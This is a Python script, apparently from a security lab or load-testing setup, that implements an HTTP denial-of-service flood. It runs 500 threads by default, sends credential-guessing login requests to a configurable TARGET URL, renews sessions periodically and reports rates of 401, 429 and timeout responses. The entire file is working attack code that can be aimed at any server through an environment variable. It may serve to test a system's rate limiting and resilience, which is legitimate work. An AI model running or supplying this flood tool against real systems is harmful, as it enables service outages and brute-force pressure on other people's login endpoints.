# HTTP DoS (Flood) Attack Module

import os
import time
import threading
import random
import requests
from collections import Counter
from requests.exceptions import Timeout, ConnectionError, RequestException

TARGET          = os.environ.get("TARGET", "http://localhost:5000")
THREAD_COUNT    = int(os.environ.get("THREAD_COUNT", "500"))
ATTACK_DURATION = int(os.environ.get("ATTACK_DURATION", "120"))
REQUEST_TIMEOUT = float(os.environ.get("REQUEST_TIMEOUT", "5"))
RENEW_INTERVAL  = int(os.environ.get("RENEW_INTERVAL", "10"))

request_count = 0
response_times = []
lock = threading.Lock()
status_counts: Counter[str] = Counter()

USERNAMES = [
    "alice.kim42", "bob.lee87",
    "james.smith", "emma.jones", "oliver.brown",
    "sophia.taylor", "noah.wilson", "isabella.davies",
]
PASSWORDS = [
    "wrong_pass_1", "wrong_pass_2", "wrong_pass_3",
    "letmein", "password123", "qwerty999",
]

def attack_worker(worker_id: int, end_time: float):
    global request_count
    sess = requests.Session()
    req_count_local = 0

    while time.time() < end_time:
        if req_count_local > 0 and req_count_local % RENEW_INTERVAL == 0:
            try:
                sess.close()
            except Exception:
                pass
            sess = requests.Session()

        try:
            start = time.time()
            resp  = sess.post(
                f"{TARGET}/api/login",
                json={
                    "username":  random.choice(USERNAMES),
                    "password":  random.choice(PASSWORDS),
                    "device_id": f"FLOOD-{worker_id:04d}",
                    "location":  "Lagos, NG",
                },
                timeout=REQUEST_TIMEOUT,
            )
            elapsed = time.time() - start
            code    = resp.status_code
            with lock:
                request_count += 1
                response_times.append(elapsed)
                status_counts[f"HTTP_{code}"] += 1
                if code == 401:
                    status_counts["AUTH_401"] += 1
                elif code == 429:
                    status_counts["RATE_LIMIT_429"] += 1
                else:
                    status_counts["OTHER_NON_2XX"] += 1
            req_count_local += 1

        except Timeout:
            with lock:
                request_count += 1
                status_counts["TIMEOUT"] += 1
            req_count_local += 1
            try:
                sess.close()
            except Exception:
                pass
            sess = requests.Session()

        except (ConnectionError, RequestException):
            with lock:
                request_count += 1
                status_counts["CONN_ERROR"] += 1
            req_count_local += 1
            try:
                sess.close()
            except Exception:
                pass
            sess = requests.Session()

        except Exception:
            with lock:
                request_count += 1
                status_counts["OTHER_ERROR"] += 1
            req_count_local += 1

    try:
        sess.close()
    except Exception:
        pass

def section(title):
    print()
    print("=" * 55)
    print(f"  {title}")
    print("=" * 55)

def avg_ms():
    if not response_times:
        return 0.0
    return sum(response_times) / len(response_times) * 1000

def get_server_stats():
    try:
        r = requests.get(f"{TARGET}/api/flood/stats", timeout=2)
        if r.ok:
            return r.json()
    except Exception:
        return None
    return None

def print_live_stats(elapsed: float):
    with lock:
        total_requests = request_count
        avg_resp       = avg_ms()
        counts         = status_counts.copy()

    rps = total_requests / elapsed if elapsed > 0 else 0.0
    print(
        f"  [{int(elapsed):>3d}s]  "
        f"Requests: {total_requests:>8,}  "
        f"RPS: {rps:>8.1f}  "
        f"Avg response: {avg_resp:>8.1f}ms"
    )
    print(
        " " * 6
        + f"401={counts.get('AUTH_401', 0):>6,}  "
        + f"429={counts.get('RATE_LIMIT_429', 0):>6,}  "
        + f"timeout={counts.get('TIMEOUT', 0):>6,}  "
        + f"conn_err={counts.get('CONN_ERROR', 0):>6,}"
    )

def main():
    section("HTTP DoS Flood Attack")
    print(f"  Target           : {TARGET}")
    print(f"  Threads          : {THREAD_COUNT}")
    print(f"  Duration         : {ATTACK_DURATION}s")
    print(f"  Request timeout  : {REQUEST_TIMEOUT}s")
    print(f"  Session renew    : every {RENEW_INTERVAL} requests")
    print(f"  Endpoint         : POST /api/login")
    print(f"  Method           : credential validation flood")
    print()

    stats = get_server_stats()
    if stats:
        print(f"  Initial RPS      : {stats['requests_last_1s']}")
        print(f"  Initial 10s load : {stats['requests_last_10s']}")
    else:
        print("  Unable to retrieve initial server stats.")

    print(f"\n  Launching {THREAD_COUNT} attack threads...")
    threads    = []
    start_time = time.time()
    end_time   = start_time + ATTACK_DURATION

    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, args=(i, end_time), daemon=True)
        t.start()
        threads.append(t)

    for _ in range(ATTACK_DURATION):
        time.sleep(1)
        elapsed = time.time() - start_time
        print_live_stats(elapsed)

    for t in threads:
        t.join()

    section("Attack Complete — Summary")
    total_time = max(time.time() - start_time, 1e-9)
    with lock:
        counts         = status_counts.copy()
        total_requests = request_count

    print()
    print(f"  Total requests       : {total_requests:,}")
    print(f"  Avg RPS              : {total_requests / total_time:.1f}")
    print(f"  Avg response time    : {avg_ms():.1f}ms")
    if response_times:
        print(f"  Min response time    : {min(response_times) * 1000:.1f}ms")
        print(f"  Max response time    : {max(response_times) * 1000:.1f}ms")
    print()
    print(f"  401 auth failures    : {counts.get('AUTH_401', 0):,}")
    print(f"  429 rate limited     : {counts.get('RATE_LIMIT_429', 0):,}")
    print(f"  Timeouts             : {counts.get('TIMEOUT', 0):,}")
    print(f"  Connection errors    : {counts.get('CONN_ERROR', 0):,}")
    print()

    stats = get_server_stats()
    if stats:
        print(f"  Server RPS (last 1s) : {stats['requests_last_1s']}")
        print(f"  Server RPS (last 10s): {stats['requests_last_10s']}")
        print(f"  Total in 60s window  : {stats['total_in_window']:,}")
    else:
        print("  Server stats unavailable — server may be down.")

    print()

if __name__ == "__main__":
    main()